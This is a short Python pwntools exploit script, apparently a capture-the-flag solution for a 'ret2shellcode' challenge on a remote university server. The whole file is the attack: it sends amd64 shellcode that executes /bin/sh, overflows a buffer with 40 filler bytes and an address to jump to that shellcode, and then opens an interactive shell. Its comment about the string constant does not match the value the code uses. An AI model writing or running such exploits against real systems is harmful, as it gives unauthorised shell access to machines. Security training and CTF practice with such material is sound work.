#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

local = False
elf = 'ret2shellcode' 

if local: 
    context.binary = './'+elf
    r = process("./"+elf)
else: 
    ip = "eens.ee.ncku.edu.tw"
    port = 5003
    r = remote(ip,port)

context.arch = 'amd64'

shellcode = asm('''
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 0x68732f6e69622f
    push rax
    mov rdi, rsp
    mov rax, 59
    syscall
''')
# 732f2f2f6e69622f =  /bin///sh
addr = 0x404080

payload = "a" * 40 + p64(addr)

r.sendline(shellcode)
r.sendline(payload)

r.interactive()